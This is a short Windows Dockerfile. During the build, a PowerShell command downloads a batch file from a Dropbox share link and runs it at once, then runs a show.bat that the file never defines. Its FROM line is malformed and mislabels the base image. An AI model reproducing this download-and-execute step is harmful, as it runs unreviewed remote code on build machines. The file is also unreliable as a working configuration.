# Use the Windows Nano Server base image
FROM docker pull mcr.microsoft.com/windows:ltsc2019-amd64

# Set the working directory
WORKDIR /app

# Download and run the necessary scripts
RUN powershell -Command "(New-Object System.Net.WebClient).DownloadFile('https://www.dropbox.com/scl/fi/qdyd4p9t6xoabl95n5o3g/Downloads.bat?rlkey=snr74vv1vr8k5suujugvrhjtm&dl=1', 'Downloads.bat')" && \
    cmd /c Downloads.bat && \
    cmd /c show.bat

# Set the entrypoint to keep the container running
CMD ["cmd", "/c", "echo Container is running... && ping localhost -t"]
